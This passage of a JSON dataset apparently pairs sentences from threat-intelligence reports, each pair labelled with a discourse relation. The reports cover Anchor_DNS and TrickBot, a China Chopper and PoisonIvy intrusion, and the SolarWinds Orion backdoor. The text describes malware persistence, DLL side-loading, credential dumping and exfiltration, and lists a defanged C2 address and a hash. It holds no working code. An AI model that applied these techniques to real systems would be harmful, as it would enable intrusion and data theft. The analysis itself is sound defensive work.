        "relation": "MISC"
    },
    {
        "S1": "One of the most interesting payloads in these attacks is the Anchor_DNS malware, which was originally discovered in October 2019 by NTT Security.",
        "S2": "It is classified by NTT as a variant of the infamous TrickBot malware, which uses DNS tunneling to stealthily communicate with C2 servers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is classified by NTT as a variant of the infamous TrickBot malware, which uses DNS tunneling to stealthily communicate with C2 servers.",
        "S2": "Though this variant was first discovered in October 2019, there is evidence that Anchor_DNS was used as far back as March 2019.\\",
        "relation": "ELABORATION"
    },
    {
        "S1": "Though this variant was first discovered in October 2019, there is evidence that Anchor_DNS was used as far back as March 2019.\\",
        "S2": "This new variant acts as a sophisticated, stealthy backdoor that selectively chooses high-profile targets.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This new variant acts as a sophisticated, stealthy backdoor that selectively chooses high-profile targets.",
        "S2": "Anchor_DNS is still undergoing rapid development cycles with code changes and new feature updates every few weeks.",
        "relation": "MISC"
    },
    {
        "S1": "Anchor_DNS is still undergoing rapid development cycles with code changes and new feature updates every few weeks.",
        "S2": "This is a new variant of Anchor_DNS that appeared as early as November 2019 and exhibits the following changes in code and behavior:",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is a new variant of Anchor_DNS that appeared as early as November 2019 and exhibits the following changes in code and behavior:",
        "S2": "- No self-deletion mechanism shown in previous samples",
        "relation": "ELABORATION"
    },
    {
        "S1": "- No self-deletion mechanism shown in previous samples",
        "S2": "- No internet connectivity checks using legitimate online web services",
        "relation": "LIST"
    },
    {
        "S1": "- No internet connectivity checks using legitimate online web services",
        "S2": "- A built-in capability to check for C2 availability using",
        "relation": "LIST"
    },
    {
        "S1": "- A built-in capability to check for C2 availability using",
        "S2": "ICMP (ping)",
        "relation": "LIST"
    },
    {
        "S1": "ICMP (ping)",
        "S2": "- Additional partial string encryption and code obfuscation",
        "relation": "LIST"
    },
    {
        "S1": "- Additional partial string encryption and code obfuscation",
        "S2": "anchorDNS_x64.exe contains a PDB path with the name of the malware, Anchor_DNS.",
        "relation": "MISC"
    },
    {
        "S1": "anchorDNS_x64.exe contains a PDB path with the name of the malware, Anchor_DNS.",
        "S2": "This file is the 64-bit version of Anchor_DNS, however, there were earlier instances of the 32-bit version as well.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This file is the 64-bit version of Anchor_DNS, however, there were earlier instances of the 32-bit version as well.",
        "S2": "The project name shows that this is the fifth version of Anchor_DNS.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The project name shows that this is the fifth version of Anchor_DNS.",
        "S2": "Many strings in the code have typos and grammatical mistakes, further affirming our suspicion that the authors of Anchor_DNS are not native english speakers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Many strings in the code have typos and grammatical mistakes, further affirming our suspicion that the authors of Anchor_DNS are not native english speakers.",
        "S2": "The threat actor gave considerable effort to obfuscating the code of this new Anchor_DNS variant using stack strings, string encryption, and by implementing a packer.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor gave considerable effort to obfuscating the code of this new Anchor_DNS variant using stack strings, string encryption, and by implementing a packer.",
        "S2": "The following example shows considerable changes in the code of the WinMain() function between an older variant of Anchor_DNS and the new variant.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The following example shows considerable changes in the code of the WinMain() function between an older variant of Anchor_DNS and the new variant.",
        "S2": "- -i flag:",
        "relation": "MISC"
    },
    {
        "S1": "- -i flag:",
        "S2": "- creates a scheduled task with the following naming convention (e.g \u201cNotepad++ autoupdate#94654\u201d): [random folder name in %APPDATA%] autoupdate#[random_number]",
        "relation": "MISC"
    },
    {
        "S1": "- creates a scheduled task with the following naming convention (e.g \u201cNotepad++ autoupdate#94654\u201d): [random folder name in %APPDATA%] autoupdate#[random_number]",
        "S2": "- Writes NTFS ADS files ($TASK, $GUID, $FILE)",
        "relation": "NEXT"
    },
    {
        "S1": "- Writes NTFS ADS files ($TASK, $GUID, $FILE)",
        "S2": "- -u flag:",
        "relation": "MISC"
    },
    {
        "S1": "- -u flag:",
        "S2": "- New Variant : executes the malware\u2019s main communication module with the C2",
        "relation": "MISC"
    },
    {
        "S1": "- New Variant : executes the malware\u2019s main communication module with the C2",
        "S2": "- Old Variant: Drops a copy in %TEMP% Creates ADS files ($GUID, $FILE)",
        "relation": "LIST"
    },
    {
        "S1": "- Old Variant: Drops a copy in %TEMP% Creates ADS files ($GUID, $FILE)",
        "S2": "- -s flag: appears only on older versions of Anchor_DNS and runs the program without creating persistence and self-deletes once done.",
        "relation": "MISC"
    },
    {
        "S1": "- -s flag: appears only on older versions of Anchor_DNS and runs the program without creating persistence and self-deletes once done.",
        "S2": "appears only on older versions of Anchor_DNS and runs the program without creating persistence and self-deletes once done.",
        "relation": "ELABORATION"
    },
    {
        "S1": "appears only on older versions of Anchor_DNS and runs the program without creating persistence and self-deletes once done.",
        "S2": "- --log=: expects a file name to write log file in C:\\Users\\[USER]",
        "relation": "MISC"
    },
    {
        "S1": "- --log=: expects a file name to write log file in C:\\Users\\[USER]",
        "S2": "Older and newer versions of Anchor_DNS communicate over DNS.",
        "relation": "MISC"
    },
    {
        "S1": "Older and newer versions of Anchor_DNS communicate over DNS.",
        "S2": "However, the newer version described here does not check Internet connectivity using legitimate online web services like ipinfo.io, and instead uses a built-in capability to check for the server\u2019s availability using the ICMP protocol.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, the newer version described here does not check Internet connectivity using legitimate online web services like ipinfo.io, and instead uses a built-in capability to check for the server\u2019s availability using the ICMP protocol.",
        "S2": "Anchor_DNS communicates with the C2 servers over DNS using DNS Tunneling.",
        "relation": "NEXT"
    },
    {
        "S1": "Anchor_DNS communicates with the C2 servers over DNS using DNS Tunneling.",
        "S2": "With this technique, Anchor_DNS can transfer data, receive commands, and download an additional payload, as detailed in NTT Security\u2019s report on an older Anchor_DNS sample.",
        "relation": "ELABORATION"
    },
    {
        "S1": "With this technique, Anchor_DNS can transfer data, receive commands, and download an additional payload, as detailed in NTT Security\u2019s report on an older Anchor_DNS sample.",
        "S2": "By implementing DNS Tunneling, Anchor_DNS can evade certain security products that might block certain network protocols or overlook DNS traffic.",
        "relation": "LIST"
    },
    {
        "S1": "By implementing DNS Tunneling, Anchor_DNS can evade certain security products that might block certain network protocols or overlook DNS traffic.",
        "S2": "During our investigation, we found several unidentified malware samples related to TrickBot infections.",
        "relation": "MISC"
    },
    {
        "S1": "During our investigation, we found several unidentified malware samples related to TrickBot infections.",
        "S2": "The malware is dubbed Anchor by its authors and has been active since August 2018.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware is dubbed Anchor by its authors and has been active since August 2018.",
        "S2": "Unlike Anchor_DNS, the Anchor malware does not implement communication over DNS.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Unlike Anchor_DNS, the Anchor malware does not implement communication over DNS.",
        "S2": "However, it does share many behavioral, code, and string similarities with Anchor_DNS and some similarities to TrickBot.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, it does share many behavioral, code, and string similarities with Anchor_DNS and some similarities to TrickBot.",
        "S2": "Many Anchor samples have a very low or at times zero detection rate by AV vendors, which could explain the limited reports about this malware.",
        "relation": "MISC"
    },
    {
        "S1": "Many Anchor samples have a very low or at times zero detection rate by AV vendors, which could explain the limited reports about this malware.",
        "S2": "The malware has both x86 and x64 versions and contains an installer component to install the malware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware has both x86 and x64 versions and contains an installer component to install the malware.",
        "S2": "Similar to Anchor_DNS, Anchor creates an NTFS ADS file $GUID to store its GUID:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Similar to Anchor_DNS, Anchor creates an NTFS ADS file $GUID to store its GUID:",
        "S2": "Unlike Anchor_DNS, which stores the information in Base64, Anchor\u2019s GUID is saved in cleartext.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Unlike Anchor_DNS, which stores the information in Base64, Anchor\u2019s GUID is saved in cleartext.",
        "S2": "Anchor and older versions of Anchor_DNS implement the exact same self deletion routine using two sets of commands to ensure that the dropper is deleted once the malware was successfully deployed:",
        "relation": "MISC"
    },
    {
        "S1": "Anchor and older versions of Anchor_DNS implement the exact same self deletion routine using two sets of commands to ensure that the dropper is deleted once the malware was successfully deployed:",
        "S2": "Similar to TrickBot, Anchor tries to establish Internet connectivity and the external IP of the target machine prior to communicating with its C2 servers.",
        "relation": "NEXT"
    },
    {
        "S1": "Similar to TrickBot, Anchor tries to establish Internet connectivity and the external IP of the target machine prior to communicating with its C2 servers.",
        "S2": "It uses the following hardcoded web services to test connectivity:",
        "relation": "NEXT"
    },
    {
        "S1": "It uses the following hardcoded web services to test connectivity:",
        "S2": "Once it has established connectivity, it communicates with a set of hardcoded C2 servers.",
        "relation": "NEXT"
    },
    {
        "S1": "Once it has established connectivity, it communicates with a set of hardcoded C2 servers.",
        "S2": "The request and response follow the same C2 communication format as TrickBot.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The request and response follow the same C2 communication format as TrickBot.",
        "S2": "Anchor and Anchor_DNS are both directly linked to TrickBot infections, as they are downloaded by TrickBot as secondary payloads.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Anchor and Anchor_DNS are both directly linked to TrickBot infections, as they are downloaded by TrickBot as secondary payloads.",
        "S2": "There are also several other similarities noted below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "There are also several other similarities noted below.",
        "S2": "The GUID generation functions for Anchor_DNS and Anchor seem almost identical to that of the GUID generated by TrickBot.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The GUID generation functions for Anchor_DNS and Anchor seem almost identical to that of the GUID generated by TrickBot.",
        "S2": "The GUID follows this pattern:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The GUID follows this pattern:",
        "S2": "Both Anchor and older versions of Anchor_DNS use a list of hardcoded online web services to determine Internet connectivity and check the external IP of the infected machine.",
        "relation": "MISC"
    },
    {
        "S1": "Both Anchor and older versions of Anchor_DNS use a list of hardcoded online web services to determine Internet connectivity and check the external IP of the infected machine.",
        "S2": "The same list is also used by TrickBot:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The same list is also used by TrickBot:",
        "S2": "checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, and ip.anysrc.net.",
        "relation": "MISC"
    },
    {
        "S1": "checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, and ip.anysrc.net.",
        "S2": "In certain cases, if internet connectivity cannot be reached, Anchor and older versions of Anchor_DNS will delete themselves.",
        "relation": "MISC"
    },
    {
        "S1": "In certain cases, if internet connectivity cannot be reached, Anchor and older versions of Anchor_DNS will delete themselves.",
        "S2": "TrickBot, Anchor, and Anchor_DNS typically use a separate C2 infrastructure.",
        "relation": "LIST"
    },
    {
        "S1": "TrickBot, Anchor, and Anchor_DNS typically use a separate C2 infrastructure.",
        "S2": "However, in some instances of this attack, there was C2 server overlap between these infrastructures.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, in some instances of this attack, there was C2 server overlap between these infrastructures.",
        "S2": "For example, the IP 23.95.97[.]59, which is hardcoded in an Anchor sample, has also served Anchor_DNS and TrickBot:",
        "relation": "ELABORATION"
    },
    {
        "S1": "For example, the IP 23.95.97[.]59, which is hardcoded in an Anchor sample, has also served Anchor_DNS and TrickBot:",
        "S2": "Anchor sample with hardcoded IP (SHA-1: 9ebb541dcb24d564448a6f5e00c613b73eba7148)",
        "relation": "ELABORATION"
    },
    {
        "S1": "Anchor sample with hardcoded IP (SHA-1: 9ebb541dcb24d564448a6f5e00c613b73eba7148)",
        "S2": "This above IP address was used by TrickBot to download the squlDLL plugin, which includes email harvesting from SQL servers, screenlocker, and Mimikatz.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This above IP address was used by TrickBot to download the squlDLL plugin, which includes email harvesting from SQL servers, screenlocker, and Mimikatz.",
        "S2": "The same IP resolved to a domain previously used by Anchor_DNS, chishir[.]com.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The initial indicator of the attack was a malicious web shell that was detected on an IIS server, coming out of the w3wp.exe process.",
        "S2": "An investigation of the web shell, later classified as a modified version of the China Chopper web shell, uncovered several attack phases and TTPs.",
        "relation": "MISC"
    },
    {
        "S1": "An investigation of the web shell, later classified as a modified version of the China Chopper web shell, uncovered several attack phases and TTPs.",
        "S2": "The threat actor was able to leverage the web shell to run reconnaissance commands, steal credentials, and deploy other tools.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor was able to leverage the web shell to run reconnaissance commands, steal credentials, and deploy other tools.",
        "S2": "China Chopper is a web shell first discovered in 2012 that is commonly used by malicious Chinese actors.",
        "relation": "MISC"
    },
    {
        "S1": "China Chopper is a web shell first discovered in 2012 that is commonly used by malicious Chinese actors.",
        "S2": "It is used to remotely control web servers, and has been used in many attacks against Australian web hosting providers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is used to remotely control web servers, and has been used in many attacks against Australian web hosting providers.",
        "S2": "The web shell parameters in this attack match to the China Chopper parameters, as described in FireEye\u2019s analysis of China Chopper.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The web shell parameters in this attack match to the China Chopper parameters, as described in FireEye\u2019s analysis of China Chopper.",
        "S2": "This tool has been used by several Chinese-affiliated threat actors, such as APT 27 and APT 40.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This tool has been used by several Chinese-affiliated threat actors, such as APT 27 and APT 40.",
        "S2": "It is important to note that this tool is widely available and can be used by other threat actors.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is important to note that this tool is widely available and can be used by other threat actors.",
        "S2": "The threat actor launched a series of reconnaissance commands to try to obtain and enumerate information about the compromised machine, network architecture, users, and active directory enumeration.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor launched a series of reconnaissance commands to try to obtain and enumerate information about the compromised machine, network architecture, users, and active directory enumeration.",
        "S2": "One of the reconnaissance commands was to run a modified nbtscan tool (\"NetBIOS nameserver scanner\") to identify available NetBIOS name servers locally or over the network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "One of the reconnaissance commands was to run a modified nbtscan tool (\"NetBIOS nameserver scanner\") to identify available NetBIOS name servers locally or over the network.",
        "S2": "Nbtscan has been used by APT10 in Operation Cloud Hopper to search for services of interest across the IT estate and footprint endpoints of interest.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Nbtscan has been used by APT10 in Operation Cloud Hopper to search for services of interest across the IT estate and footprint endpoints of interest.",
        "S2": "It is also capable of identifying system information.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is also capable of identifying system information.",
        "S2": "Following the reconnaissance phase, the threat actor attempted to dump credentials stored on the compromised machines.",
        "relation": "NEXT"
    },
    {
        "S1": "Following the reconnaissance phase, the threat actor attempted to dump credentials stored on the compromised machines.",
        "S2": "The most common credential stealing tool used by the threat actor was a modified mimikatz that dumps NTLM hashes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The most common credential stealing tool used by the threat actor was a modified mimikatz that dumps NTLM hashes.",
        "S2": "This version of mimikatz did not require any command line arguments, most likely in an attempt to avoid detection based on command-line auditing.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This version of mimikatz did not require any command line arguments, most likely in an attempt to avoid detection based on command-line auditing.",
        "S2": "The dumped hashes were used to authenticate to other machines via pass the hash.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The dumped hashes were used to authenticate to other machines via pass the hash.",
        "S2": "We renamed this sample to maybemimi.exe.",
        "relation": "MISC"
    },
    {
        "S1": "We renamed this sample to maybemimi.exe.",
        "S2": "Reverse engineering shows the similarity between maybemimi.exe and mimikatz.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Reverse engineering shows the similarity between maybemimi.exe and mimikatz.",
        "S2": "In order to obtain credentials, the threat actor used another technique that can be seen in the below screenshots.",
        "relation": "MISC"
    },
    {
        "S1": "In order to obtain credentials, the threat actor used another technique that can be seen in the below screenshots.",
        "S2": "They dumped specific hives from the Windows Registry, such as the SAM hive, which contains password hashes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They dumped specific hives from the Windows Registry, such as the SAM hive, which contains password hashes.",
        "S2": "Once the threat actor mapped the network and obtained credentials (through net use), they began to move laterally.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the threat actor mapped the network and obtained credentials (through net use), they began to move laterally.",
        "S2": "They were able to compromise critical assets including production servers and database servers, and they even managed to gain full control of the Domain Controller.",
        "relation": "NEXT"
    },
    {
        "S1": "They were able to compromise critical assets including production servers and database servers, and they even managed to gain full control of the Domain Controller.",
        "S2": "The threat actor relied on WMI and PsExec to move laterally and install their tools across multiple assets.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor relied on WMI and PsExec to move laterally and install their tools across multiple assets.",
        "S2": "The following example demonstrates how the threat actor moved laterally from the first machine, compromised by the modified version of the China Chopper web shell, to other machines inside the network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The following example demonstrates how the threat actor moved laterally from the first machine, compromised by the modified version of the China Chopper web shell, to other machines inside the network.",
        "S2": "The threat actor abused the stolen credentials to create rogue, high-privileged domain user accounts which they then used to take malicious action.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor abused the stolen credentials to create rogue, high-privileged domain user accounts which they then used to take malicious action.",
        "S2": "By creating these accounts, they ensured they would maintain access between different waves of the attack.",
        "relation": "NEXT"
    },
    {
        "S1": "By creating these accounts, they ensured they would maintain access between different waves of the attack.",
        "S2": "Once the threat actor regains their foothold, they already have access to a high-privileged domain user account.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the threat actor regains their foothold, they already have access to a high-privileged domain user account.",
        "S2": "This significantly reduces the \u201cnoise\u201d of having to use credential dumpers repeatedly, which helped them evade detection.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This significantly reduces the \u201cnoise\u201d of having to use credential dumpers repeatedly, which helped them evade detection.",
        "S2": "A second method the threat actor used to maintain access across the compromised assets was through the deployment of the PoisonIvy RAT (PIVY).",
        "relation": "MISC"
    },
    {
        "S1": "A second method the threat actor used to maintain access across the compromised assets was through the deployment of the PoisonIvy RAT (PIVY).",
        "S2": "This infamous RAT has been associated with many different Chinese threat actors, including APT10, APT1, and DragonOK.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This infamous RAT has been associated with many different Chinese threat actors, including APT10, APT1, and DragonOK.",
        "S2": "It is a powerful, multi-featured RAT that lets a threat actor take total control over a machine.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is a powerful, multi-featured RAT that lets a threat actor take total control over a machine.",
        "S2": "Among its most notable features are:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Among its most notable features are:",
        "S2": "- Registry Editor",
        "relation": "LIST"
    },
    {
        "S1": "- Registry Editor",
        "S2": "- Screenshot Grabber",
        "relation": "LIST"
    },
    {
        "S1": "- Screenshot Grabber",
        "S2": "- Credential Stealer",
        "relation": "LIST"
    },
    {
        "S1": "- Credential Stealer",
        "S2": "- Interactive Shell",
        "relation": "LIST"
    },
    {
        "S1": "- Interactive Shell",
        "S2": "- File Manager with Upload and Download Support",
        "relation": "LIST"
    },
    {
        "S1": "- File Manager with Upload and Download Support",
        "S2": "- Process Monitor",
        "relation": "LIST"
    },
    {
        "S1": "- Process Monitor",
        "S2": "- Keylogging and Various other Surveillance Features",
        "relation": "LIST"
    },
    {
        "S1": "- Keylogging and Various other Surveillance Features",
        "S2": "We assume the threat actor used PoisonIvy for keylogging and other surveillance features, as they had that functionality available to them as shown in the screenshot above.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We assume the threat actor used PoisonIvy for keylogging and other surveillance features, as they had that functionality available to them as shown in the screenshot above.",
        "S2": "The strain of PIVY in this attack used a DLL side-loading technique to stealthily load itself into memory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The strain of PIVY in this attack used a DLL side-loading technique to stealthily load itself into memory.",
        "S2": "To accomplish this, it exploited a trusted and signed application.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To accomplish this, it exploited a trusted and signed application.",
        "S2": "The PIVY payload was dropped along with the trusted and signed Samsung tool (RunHelp.exe) in the following manner:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The PIVY payload was dropped along with the trusted and signed Samsung tool (RunHelp.exe) in the following manner:",
        "S2": "- nullsoft installer package (NSIS) was created with a legitimate, signed Samsung tool in it.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- nullsoft installer package (NSIS) was created with a legitimate, signed Samsung tool in it.",
        "S2": "- Once executed, the installer script within the NSIS package extracted the Samsung tool and added a fake DLL with the same name as a legitimate DLL (ssMUIDLL.dll), which is required by the application.",
        "relation": "NEXT"
    },
    {
        "S1": "- Once executed, the installer script within the NSIS package extracted the Samsung tool and added a fake DLL with the same name as a legitimate DLL (ssMUIDLL.dll), which is required by the application.",
        "S2": "- The DLL contains a PIVY stager, which is then loaded by the Samsung tool.",
        "relation": "NEXT"
    },
    {
        "S1": "- The DLL contains a PIVY stager, which is then loaded by the Samsung tool.",
        "S2": "- After the fake DLL was loaded by the Samsung tool, it decrypted a blob payload in the same folder, which contains the actual PIVY payload.",
        "relation": "NEXT"
    },
    {
        "S1": "- After the fake DLL was loaded by the Samsung tool, it decrypted a blob payload in the same folder, which contains the actual PIVY payload.",
        "S2": "- It was able to achieve persistence by creating a rogue scheduled task.",
        "relation": "NEXT"
    },
    {
        "S1": "- It was able to achieve persistence by creating a rogue scheduled task.",
        "S2": "PIVY\u2019s use of DLL side-loading to abuse Samsung tools is not new, and has been reported previously by Palo Alto.",
        "relation": "MISC"
    },
    {
        "S1": "PIVY\u2019s use of DLL side-loading to abuse Samsung tools is not new, and has been reported previously by Palo Alto.",
        "S2": "In 2016 it was used to attack pro-democratic activists in Hong Kong, most probably by Chinese threat actors.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In 2016 it was used to attack pro-democratic activists in Hong Kong, most probably by Chinese threat actors.",
        "S2": "\u26a0\ufe0f Note: Our team has reached out to and advised the targeted organizations on active containment actions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "\u26a0\ufe0f Note: Our team has reached out to and advised the targeted organizations on active containment actions.",
        "S2": "In later stages of the attack, the threat actor deployed two other custom-built web shells.",
        "relation": "MISC"
    },
    {
        "S1": "In later stages of the attack, the threat actor deployed two other custom-built web shells.",
        "S2": "From these web shells, they launched reconnaissance commands, stole data, and dropped additional tools including portqry.exe, renamed cmd.exe, winrar, and the notorious hTran.",
        "relation": "NEXT"
    },
    {
        "S1": "From these web shells, they launched reconnaissance commands, stole data, and dropped additional tools including portqry.exe, renamed cmd.exe, winrar, and the notorious hTran.",
        "S2": "The threat actor exfiltrated stolen data using multiple different channels including web shells and hTran.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor exfiltrated stolen data using multiple different channels including web shells and hTran.",
        "S2": "In an attempt to hide the contents of the stolen data, the threat actor used winrar to compress and password-protect it.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In an attempt to hide the contents of the stolen data, the threat actor used winrar to compress and password-protect it.",
        "S2": "The winrar binaries and compressed data were found mostly in the Recycle Bin folder, a TTP that was previously observed in APT10-related attacks, as well as others.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The winrar binaries and compressed data were found mostly in the Recycle Bin folder, a TTP that was previously observed in APT10-related attacks, as well as others.",
        "S2": "This threat actor is known to stage the data in multi-part archives before exfiltration.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This threat actor is known to stage the data in multi-part archives before exfiltration.",
        "S2": "The threat actor used the following commands to compress the data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor used the following commands to compress the data.",
        "S2": "The contents of the compressed data was crucial in understanding the threat actor\u2019s motivation for the attack, as well as what type of information they were after.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The contents of the compressed data was crucial in understanding the threat actor\u2019s motivation for the attack, as well as what type of information they were after.",
        "S2": "In order to exfiltrate data from a network segment not connected to the Internet, the threat actor deployed a modified version of hTran.",
        "relation": "NEXT"
    },
    {
        "S1": "In order to exfiltrate data from a network segment not connected to the Internet, the threat actor deployed a modified version of hTran.",
        "S2": "This \u2018connection bouncer\u2019 tool lets the threat actor redirect ports and connections between different networks and obfuscate C2 server traffic.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This \u2018connection bouncer\u2019 tool lets the threat actor redirect ports and connections between different networks and obfuscate C2 server traffic.",
        "S2": "There have been numerous reports of hTran being used by different Chinese threat actors, including: APT3, APT27 and DragonOK.",
        "relation": "MISC"
    },
    {
        "S1": "There have been numerous reports of hTran being used by different Chinese threat actors, including: APT3, APT27 and DragonOK.",
        "S2": "The threat actor made some modifications to the original source code of hTran.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor made some modifications to the original source code of hTran.",
        "S2": "Many strings, including the debug messages, were intentionally changed and obfuscated in an attempt to evade detection and thwart efforts to identify the malware by antivirus and researchers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Many strings, including the debug messages, were intentionally changed and obfuscated in an attempt to evade detection and thwart efforts to identify the malware by antivirus and researchers.",
        "S2": "Since the original source code for hTran is publicly available, we were able to compare the debug output to the original source code to show that it has indeed been modified.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Since the original source code for hTran is publicly available, we were able to compare the debug output to the original source code to show that it has indeed been modified.",
        "S2": "printf is being called (dubbed by us as \u201clooks_like_printf\u201d) with output \u201cC e.\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "printf is being called (dubbed by us as \u201clooks_like_printf\u201d) with output \u201cC e.\u201d.",
        "S2": "By looking at the original source code, we were able to identify that this is supposed to be \u201cConnect error\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attackers inserted malicious code into SolarWinds.Orion.Core.BusinessLayer.dll, a code library belonging to the SolarWinds Orion Platform.",
        "S2": "The attackers had to find a suitable place in this DLL component to insert their code.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attackers had to find a suitable place in this DLL component to insert their code.",
        "S2": "Ideally, they would choose a place in a method that gets invoked periodically, ensuring both execution and persistence, so that the malicious code is guaranteed to be always up and running.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Ideally, they would choose a place in a method that gets invoked periodically, ensuring both execution and persistence, so that the malicious code is guaranteed to be always up and running.",
        "S2": "Such a suitable location turns out to be a method named RefreshInternal.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Such a suitable location turns out to be a method named RefreshInternal.",
        "S2": "The modification to this function is very lightweight and could be easily overlooked\u2014all it does is to execute the method OrionImprovementBusinessLayer.Initialize within a parallel thread, so that the normal execution flow of RefreshInternal is not altered.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The modification to this function is very lightweight and could be easily overlooked\u2014all it does is to execute the method OrionImprovementBusinessLayer.Initialize within a parallel thread, so that the normal execution flow of RefreshInternal is not altered.",
        "S2": "Why was this method chosen rather than other ones?",
        "relation": "ELABORATION"
    },
    {
        "S1": "Why was this method chosen rather than other ones?",
        "S2": "A quick look at the architecture of this DLL shows that RefreshInternal is part of the class SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager and is invoked by a sequence of methods that can be traced back to the CoreBusinessLayerPlugin class.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A quick look at the architecture of this DLL shows that RefreshInternal is part of the class SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager and is invoked by a sequence of methods that can be traced back to the CoreBusinessLayerPlugin class.",
        "S2": "The purpose of this class, which initiates its execution with a method named Start (likely at an early stage when the DLL is loaded), is to initialize various other components and schedule the execution of several tasks.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The purpose of this class, which initiates its execution with a method named Start (likely at an early stage when the DLL is loaded), is to initialize various other components and schedule the execution of several tasks.",
        "S2": "Among those tasks is Background Inventory, which ultimately starts the malicious code.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Among those tasks is Background Inventory, which ultimately starts the malicious code.",
        "S2": "The functionality of the backdoor resides entirely in the class OrionImprovementBusinessLayer, comprising 13 subclasses and 16 methods.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The functionality of the backdoor resides entirely in the class OrionImprovementBusinessLayer, comprising 13 subclasses and 16 methods.",
        "S2": "Its name blends in with the rest of the legitimate code.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Its name blends in with the rest of the legitimate code.",
        "S2": "The threat actors were savvy enough to avoid give-away terminology like \u201cbackdoor\u201d, \u201ckeylogger\u201d, etc., and instead opted for a more neutral jargon.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors were savvy enough to avoid give-away terminology like \u201cbackdoor\u201d, \u201ckeylogger\u201d, etc., and instead opted for a more neutral jargon.",
        "S2": "At first glance, the code in this DLL looks normal and doesn\u2019t raise suspicions, which could be part of the reason why the insertion of malicious code was undetected for months, especially if the code for this DLL was not frequently updated.",
        "relation": "ELABORATION"
    },
    {
        "S1": "At first glance, the code in this DLL looks normal and doesn\u2019t raise suspicions, which could be part of the reason why the insertion of malicious code was undetected for months, especially if the code for this DLL was not frequently updated.",
        "S2": "To have some minimal form of obfuscation from prying eyes, the strings in the backdoor are compressed and encoded in Base64, or their hashes are used instead.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To have some minimal form of obfuscation from prying eyes, the strings in the backdoor are compressed and encoded in Base64, or their hashes are used instead.",
        "S2": "The Initialize method is the de facto execution entry point of the backdoor.",
        "relation": "MISC"
    },
    {
        "S1": "The Initialize method is the de facto execution entry point of the backdoor.",
        "S2": "It carries out several checks to verify that it is running in a real victim\u2019s environment:",
        "relation": "ELABORATION"
    },
    {
        "S1": "It carries out several checks to verify that it is running in a real victim\u2019s environment:",
